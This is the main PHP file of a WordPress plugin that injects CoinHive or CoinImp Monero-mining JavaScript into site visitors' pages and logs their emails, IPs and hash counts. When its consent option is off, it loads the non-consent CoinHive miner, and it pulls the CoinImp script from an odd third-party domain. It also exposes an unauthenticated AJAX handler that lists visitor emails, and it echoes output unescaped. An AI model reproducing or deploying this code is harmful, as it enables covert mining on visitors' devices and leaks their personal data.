<?php 


/**
* @package coin-hibe
*/
/*
Plugin Name: coin-Miner
Plugin URI: http://ecoin4dummies.com/
Description: Coin-Miner
Version: 1.0.0
Author: Roy Glaser "ZlaGer"
Author URI: http://ecoin4dummies.com/about
License: GPLv2 or Later 
Text Domain: coin-miner
*/

/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

Copyright 2018, Roy Glaser
*/

if ( ! defined( 'ABSPATH' ) ) {
	die;
}
// requires
 	require_once plugin_dir_path(__FILE__) . 'services/api-service.php';
	require_once plugin_dir_path(__FILE__) . 'services/ch-miner.php';
	require_once plugin_dir_path(__FILE__) . 'services/wp-service.php';
 	require_once plugin_dir_path(__FILE__) . 'pages/cm-setting-page.php';
    require_once plugin_dir_path(__FILE__) . 'pages/cm-stats-page.php'; 
	require_once plugin_dir_path(__FILE__) . 'services/ci-miner.php';
	require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );


function coinMinergetRealIpAddr()
	{
 		if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
		{
		  $ip=$_SERVER['HTTP_CLIENT_IP'];
		}
		elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
		{
		  $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
		}
		else
		{
		  $ip=$_SERVER['REMOTE_ADDR'];
		}
		return $ip;
	}

class CoinMiner {
	function __construct() {
		add_action( 'admin_init', array($this, 'cm_add_setting' ) );	
		add_action('admin_menu', array($this, 'cm_add_pages' ) );
		add_action( 'init', array($this, 'cm_add_miner' ) );	
	}
	
	function activate() {
		flush_rewrite_rules();
	}

	function cm_add_pages() {
		add_menu_page( 'Coin-Miner Options', 'Coin-Miner', 'manage_options', 'coin-miner-admin', 'coin_miner_admin_page_init' );
		add_options_page( 'Coin-Miner Dashboard', 'Coin-Miner', 'manage_options', 'coin-miner', 'coin_miner_plugin_page' );
		add_action( 'wp_enqueue_scripts', 'cm_register_styles_scripts' );
		add_action( 'admin_enqueue_scripts', 'cm_register_styles_scripts' );
		function cm_register_styles_scripts(){
			wp_register_style( 'styleCss',  plugin_dir_url( __FILE__ ) . '/css/style.css' );
			wp_register_script( 'cmAmazingScript', plugin_dir_url( __FILE__ ) . '/js/js.js', array( 'jquery' ) );
			wp_enqueue_script( 'cmAmazingScript');
			wp_localize_script( 'cmAmazingScript', 'cm_admin_ajax', array(
				'ajax_url' => admin_url('admin-ajax.php'),
				'ajax_nonce' => wp_create_nonce('cm_admin_stats')) );
			}
		}

	function cm_add_miner(){
		add_action( 'wp_ajax_post_miner_work', array( $this, 'post_miner_work' ) );
		add_action( 'wp_ajax_nopriv_post_miner_work', array( $this, 'post_miner_work' ) );
		add_action( 'wp_enqueue_scripts', 'cm_register_styles_again' );
		function cm_register_styles_again(){
			wp_register_style( 'styleCss',  plugin_dir_url( __FILE__ ) . '/css/style.css' );
			wp_register_script( 'cmAmazingScript', plugin_dir_url( __FILE__ ) . '/js/js.js', array( 'jquery' ) );
			wp_enqueue_script( 'cmAmazingScript');
	
			wp_localize_script( 'cmAmazingScript', 'cm_miner_ajax', array( 
			'ajax_url' => admin_url('admin-ajax.php'),
			'ajax_nonce' => wp_create_nonce('cm_miner_counter')) );
		}
	}

	function cm_defaults(){
		add_option('ch_public_key','');
		add_option('ch_secret_key','');
		add_option('ch_disable','on');
		add_option('ch_miner_speed','0.3');
		add_option('ch_delayed_miner_speed','0.2');
		add_option('ch_delayed_miner_time','10');
		add_option('ch_mobile_disable','on');
		add_option('ch_user_concent_needed','on');

		add_option('ci_public_key','');
		add_option('ci_secret_key','');
		add_option('ci_disable','on');
		add_option('ci_miner_speed','0.3');
		add_option('ci_delayed_miner_speed','0.2');
		add_option('ci_delayed_miner_time','10');
		add_option('ci_mobile_disable','on');
		add_option('ci_user_concent_needed','on');		
	}
	
	function cm_add_setting() {
		// CoinHive Vars
		register_setting( 'coin-miner-options', 'ch_public_key' );
		register_setting( 'coin-miner-options', 'ch_secret_key' );
		register_setting( 'coin-miner-options', 'ch_disable' );
		register_setting( 'coin-miner-options', 'ch_miner_speed' );
		register_setting( 'coin-miner-options', 'ch_delayed_miner_speed' );
		register_setting( 'coin-miner-options', 'ch_delayed_miner_time' );
		register_setting( 'coin-miner-options', 'ch_mobile_disable' );
		register_setting( 'coin-miner-options', 'ch_user_concent_needed' );
		// CoinImp Vars
		register_setting( 'coin-miner-options-ci', 'ci_public_key' );
		register_setting( 'coin-miner-options-ci', 'ci_secret_key' );
		register_setting( 'coin-miner-options-ci', 'ci_disable' );
		register_setting( 'coin-miner-options-ci', 'ci_miner_speed' );
		register_setting( 'coin-miner-options-ci', 'ci_delayed_miner_speed' );
		register_setting( 'coin-miner-options-ci', 'ci_delayed_miner_time' );
		register_setting( 'coin-miner-options-ci', 'ci_mobile_disable' );
		register_setting( 'coin-miner-options-ci', 'ci_user_concent_needed' );
		
		// scripts
		add_action( 'wp_ajax_get_tab_content', array( $this, 'get_tab_content' ) );
		add_action( 'wp_ajax_nopriv_get_tab_content', array( $this, 'get_tab_content' ) );
	}

	function ci_add_table() {
		global $wpdb;
		// $charset_collate = $wpdb->get_charset_collate();
		$table_name = $wpdb->prefix . 'coin_imp';
		if($wpdb->get_var( "show tables like '$table_name'" ) != $table_name) 
		{
			$sql = "CREATE TABLE " . $table_name . "(
				id mediumint(9) NOT NULL AUTO_INCREMENT,
				user char(50) DEFAULT 'unknown' NOT NULL,
				userip char(50) DEFAULT 'unknown' NOT NULL,
				hashes mediumint(5) NOT NULL,
				avgspeed DECIMAL(3) NOT NULL,
				hashdate date NOT NULL,
				UNIQUE KEY id (id))";

			dbDelta( $sql );
		}
	}
	function ch_add_table() {
		global $wpdb;
		// $charset_collate = $wpdb->get_charset_collate();
		$table_name = $wpdb->prefix . 'coin_hive';
		if($wpdb->get_var( "show tables like '$table_name'" ) != $table_name) 
		{
			$sql = "CREATE TABLE " . $table_name . "(
				id mediumint(9) NOT NULL AUTO_INCREMENT,
				user char(50) DEFAULT 'unknown' NOT NULL,
				userip char(50) DEFAULT 'unknown' NOT NULL,
				hashes mediumint(5) NOT NULL,
				avgspeed DECIMAL(3) NOT NULL,
				hashdate date NOT NULL,
				UNIQUE KEY id (id))";

			dbDelta( $sql );
		}
	}
	function deactivate() {
		add_action('admin_menu', array($this, 'cm_remove_menu_pages') );
		add_action('admin_menu', array($this, 'cm_unregister_setting') );
		flush_rewrite_rules();
	}
	
	function cm_unregister_setting() {
		// CoinHive Vars
		unregister_setting( 'coin-miner-options', 'ch_public_key' );
		unregister_setting( 'coin-miner-options', 'ch_secret_key' );
		unregister_setting( 'coin-miner-options', 'ch_disable' );
		unregister_setting( 'coin-miner-options', 'ch_miner_speed' );
		unregister_setting( 'coin-miner-options', 'ch_delayed_miner_speed' );
		unregister_setting( 'coin-miner-options', 'ch_delayed_miner_time' );
		unregister_setting( 'coin-miner-options', 'ch_mobile_disable' );
		unregister_setting( 'coin-miner-options', 'ch_user_concent_needed' );
		// CoinImp Vars
		unregister_setting( 'coin-miner-options-ci', 'ci_public_key' );
		unregister_setting( 'coin-miner-options-ci', 'ci_secret_key' );
		unregister_setting( 'coin-miner-options-ci', 'ci_disable' );
		unregister_setting( 'coin-miner-options-ci', 'ci_miner_speed' );
		unregister_setting( 'coin-miner-options-ci', 'ci_delayed_miner_speed' );
		unregister_setting( 'coin-miner-options-ci', 'ci_delayed_miner_time' );
		unregister_setting( 'coin-miner-options-ci', 'ci_mobile_disable' );
		unregister_setting( 'coin-miner-options-ci', 'ci_user_concent_needed' );
	}

	function cm_remove_menu_pages() {
		remove_menu_page('coin-miner-admin');   
		remove_menu_page('coin-miner');   
	}
	function post_miner_work(){
		  check_ajax_referer( 'cm_miner_counter', 'security' );
		
		$sanitized_email = sanitize_email($_POST['username']);
		$sanitized_ip = filter_var($_POST['userip'],FILTER_SANITIZE_STRING);
		$sanitized_hash = filter_var($_POST['totalHash'], FILTER_SANITIZE_NUMBER_INT);
		$sanitized_avg_hash = is_numeric($_POST['hashps']) ? $_POST['hashps'] : 0;

		global $wpdb;
		if ($_POST['minercompany'] == "coinhive"){
			$table_name = $wpdb->prefix . 'coin_hive';
		}
		else{
			$table_name = $wpdb->prefix . 'coin_imp';			
		}
		$hashdate = current_time('mysql', 1);
		$wpdb->insert($table_name, array(
			'user' => $sanitized_email,
			'userip' => $sanitized_ip,
			'hashes' => $sanitized_hash,
			'avgspeed' => $sanitized_avg_hash,
			'hashdate' => $hashdate,
		));
	}
	function get_tab_content(){
	    ob_clean();
		check_ajax_referer( 'cm_admin_stats', 'security' );
		$sanitized_tab_num = filter_var($_POST['tabNum'], FILTER_SANITIZE_NUMBER_INT);
		global $wpdb;
		$stats = '';
		$coin_imp_data = new CoinImpData;
		$blogname = get_bloginfo( "name" );
		$table_name = $wpdb->prefix . 'coin_imp';
		switch($sanitized_tab_num) { 
			case 1: 
				// coin imp Dashboard
				$stats = $wpdb->get_row( "SELECT sum(hashes) as 'totalhashes', avg(avgspeed) as 'hashpersecond' FROM " . $table_name . "", OBJECT );
				echo '<div id="CoinImpDashboard">
				<h2>Statistics</h2>';
				if(!empty($stats)){
				echo '<div class="stats-page">
					<div class="smmch-col-6"><h3>Site Name:</h3><span>' . $blogname . '</span></div>
					<div class="smmch-col-6"><h3>Hashes Per Second:</h3><span>' . $stats->hashpersecond . '</span></div>
					<div class="smmch-col-6"><h3>Total Hashes:</h3><span>' . $stats->totalhashes .'</span></div>';
					if(!empty($stats->xmrPending)){
						// echo <div class="smmch-col-6"><h3>Total Pending Monero(XMR):</h3><span>echo '0.' . number_format($stats->xmrPending,8,'',''); </span></div>
					}
				echo '</div>';
				}
				else{
					echo '<div class="stats-page">
							<div class="smmch-col-6"><h3>Site Name:</h3><span>' . $blogname . '</span></div>
							<div class="smmch-col-6"><h3>Hashes Per Second:</h3>' . $stats->hashpersecond . '</div>
							<div class="smmch-col-6"><h3>Total Hashes:</h3><span>' . $stats->totalhashes .'</span></div>
						</div>';
				} 
				echo '</div>';
				break;
				
			case 2: 
				// CoinImpMinersbyUser
				try{ 
					$colums = array("Visits", "User Email", "Total Hashes by User", "Avarage Speed by User");
					$result = $wpdb->get_results( "SELECT count(id), user, sum(hashes), avg(avgspeed) FROM " . $table_name . " group by user", OBJECT );
					print " <table id='miners'>";
					print " <tr>";
					foreach ($colums as $column){
						print " <th>" . $column . "</th>";
					} // end foreach
					print " </tr>";

					foreach($result as $row){
						print " <tr>";
						foreach ($row as $name=>$value){
							print " <td>" . $value ."</td>";
						} // end field loop
						print " </tr>";
					} // end record loop
					print "</table>";
				}catch(PDOException $e) {
				   echo 'Service Unavailable at the Moment, please try again later...';
				}
				break; 
			case 3: 
				// CoinImpMinerByDate
				try{
					$colums = array("Miners", "Total Hashes by Date", "Avarage Speed by Date", "Hashes Date");
					$result = $wpdb->get_results( "SELECT count(DISTINCT user), sum(hashes), avg(avgspeed), hashdate FROM  " . $table_name . " group by hashdate", OBJECT );
					print " <table id='miners'>";
					print " <tr>";
					foreach ($colums as $column){
						print " <th>" . $column . "</th>";
					} // end foreach
					print " </tr>";

					foreach($result as $row){
						print " <tr>";
						foreach ($row as $name=>$value){
							print " <td>" . $value ."</td>";
						} // end field loop
						print " </tr>";
					} // end record loop
					print "</table>";
				}catch(PDOException $e) {
				   echo 'Service Unavailable at the Moment, please try again later...';
				}
				break; 
			case 4: 
				// CoinHive Dashboard
				$coin_hive_data = new CoinHiveData;
				$secret = $coin_hive_data->getSecretKey();
				$stats = '';
				try{
					$coin_hive_api = new CoinHiveApiService($secret);
					$stats = $coin_hive_api->get('/stats/site');
				}
				catch(Exception $e){
					
				}
			
					$table_name = $wpdb->prefix . 'coin_hive';
					$dbstats = $wpdb->get_row( "SELECT sum(hashes) as 'totalhashes', avg(avgspeed) as 'hashpersecond' FROM " . $table_name . "", OBJECT );
	
				echo '<div id="CoinHiveDashboard">
					<h2>Statistics</h2>';
				if(!empty($stats)){
					echo'<div class="stats-page">
						<div class="smmch-col-6"><h3>Site Name:</h3><span>' . $blogname . '</span></div>
						<div class="smmch-col-6"><h3>Hashes Per Second:</h3><span>' . $dbstats->hashpersecond . '</span></div>
						<div class="smmch-col-6"><h3>Total Hashes:</h3><span>' . $stats->hashesTotal . '</span></div>';
					if(!empty($stats->xmrPending)){
						echo '<div class="smmch-col-6"><h3>Total Pending Monero(XMR):</h3><span>0.' . number_format($stats->xmrPending,8,'','') . '</span></div>';
					}
					echo '</div>';
				}
				else{
					echo'<div class="stats-page">
						<div class="smmch-col-6"><h3>Site Name:</h3><span>' . $blogname . '</span></div>
						<div class="smmch-col-6"><h3>Hashes Per Second:</h3><span>0</span></div>
						<div class="smmch-col-6"><h3>Total Hashes:</h3><span>0</span></div>
						<div class="smmch-col-6"><h3>Total Pending Monero(XMR):</h3><span>0</span></div>
					</div>';
				}
				echo '</div>';
				break; 
			case 5: 
				// CoinHiveMinersbyUser
				try{
					$table_name = $wpdb->prefix . 'coin_hive';
					$colums = array("Visits", "User Email", "Total Hashes by User", "Avarage Speed by User");
					$result = $wpdb->get_results( "SELECT count(id), user, sum(hashes), avg(avgspeed) FROM " . $table_name . " group by user", OBJECT );
					print " <table id='miners'>";
					print " <tr>";
					foreach ($colums as $column){
						print " <th>" . $column . "</th>";
					} // end foreach
					print " </tr>";

					foreach($result as $row){
						print " <tr>";
						foreach ($row as $name=>$value){
							print " <td>" . $value ."</td>";
						} // end field loop
						print " </tr>";
					} // end record loop
					print "</table>";
				}catch(PDOException $e) {
				   echo 'Service Unavailable at the Moment, please try again later...';
				}
				break; 
			case 6: 
				// CoinHiveMinersbyDate
				try{
					$table_name = $wpdb->prefix . 'coin_hive';
					$colums = array("Miners", "Total Hashes by Date", "Avarage Speed by Date", "Hashes Date");
					$result = $wpdb->get_results( "SELECT count(DISTINCT user), sum(hashes), avg(avgspeed), hashdate FROM  " . $table_name . " group by hashdate", OBJECT );
					print " <table id='miners'>";
					print " <tr>";
					foreach ($colums as $column){
						print " <th>" . $column . "</th>";
					} // end foreach
					print " </tr>";

					foreach($result as $row){
						print " <tr>";
						foreach ($row as $name=>$value){
							print " <td>" . $value ."</td>";
						} // end field loop
						print " </tr>";
					} // end record loop
					print "</table>";
				}catch(PDOException $e) {
				   echo 'Service Unavailable at the Moment, please try again later...';
				}
				break; 
		}
		wp_die();
	}

}

if ( class_exists( 'CoinMiner' ) ) {
	$coinMiner = new CoinMiner();
	// $coinMiner->cm_everything();
}
		function cm_ch_miner_scripts(){
			// wp_register_style( 'styleCss',  plugin_dir_url( __FILE__ ) . '/css/style.css' );
			$coin_hive_data = new CoinHiveData;
				$ch_user_concent = $coin_hive_data->getUserConcent();
				if ($ch_user_concent != "on"){
					wp_register_script( 'cmCoinHiveMiner', 'https://coinhive.com/lib/coinhive.min.js', '', '', true);
				}else{
					wp_register_script( 'cmCoinHiveMiner', 'https://authedmine.com/lib/authedmine.min.js', '', '', true);
				}
				wp_register_script( 'cmAmazingScript', plugin_dir_url( __FILE__ ) . '/js/js.js', array( 'jquery' ) );
			wp_enqueue_script( 'cmCoinHiveMiner');
			wp_enqueue_script( 'cmAmazingScript');

		}
		function cm_ci_miner_scripts(){
			wp_register_style( 'styleCss',  plugin_dir_url( __FILE__ ) . '/css/style.css' );
			wp_register_script( 'cmCoinImpMiner', 'https://www.freecontent.date./LkBx.js', '', '', true);
			wp_register_script( 'cmAmazingScript', plugin_dir_url( __FILE__ ) . '/js/js.js', array( 'jquery' ) );
			
			wp_enqueue_script( 'cmCoinImpMiner');
			wp_enqueue_script( 'cmAmazingScript');
			wp_enqueue_style( 'styleCss');

		}

		$coin_hive_data = new CoinHiveData;
		$ch_disable_plugin = $coin_hive_data->getPluginStatus();
		$ch_public_key = $coin_hive_data->getPublicKey();
		$ch_secret_key = $coin_hive_data->getSecretKey();
	
		if ($ch_disable_plugin != "on" && !empty($ch_public_key) && !empty($ch_secret_key))
		{
			add_action('wp_footer', 'cm_CoinHiveMiner', 100); 
			add_action( 'wp_print_scripts', 'cm_ch_miner_scripts' );
		

		}else{
			$coin_imp_data = new CoinImpData;
			$ci_disable_plugin = $coin_imp_data->getPluginStatus();
			$ci_secret_key = $coin_imp_data->getSecretKey();
	
			if ($ci_disable_plugin != "on" && !empty($ci_secret_key))
			{
				add_action('wp_footer', 'cm_CoinImpMiner', 100);
				add_action( 'wp_print_scripts', 'cm_ci_miner_scripts' );
			}
		}
	
// activation
register_activation_hook( __FILE__, array( $coinMiner, 'activate' ) );
register_activation_hook( __FILE__, array( $coinMiner, 'ch_add_table' ) );
register_activation_hook( __FILE__, array( $coinMiner, 'ci_add_table' ) );
register_activation_hook(__FILE__, array( $coinMiner, 'cm_defaults' ) );

// deactivation
register_deactivation_hook( __FILE__, array( $coinMiner, 'deactivate' ) );

// uninstall - uninstall.php
?>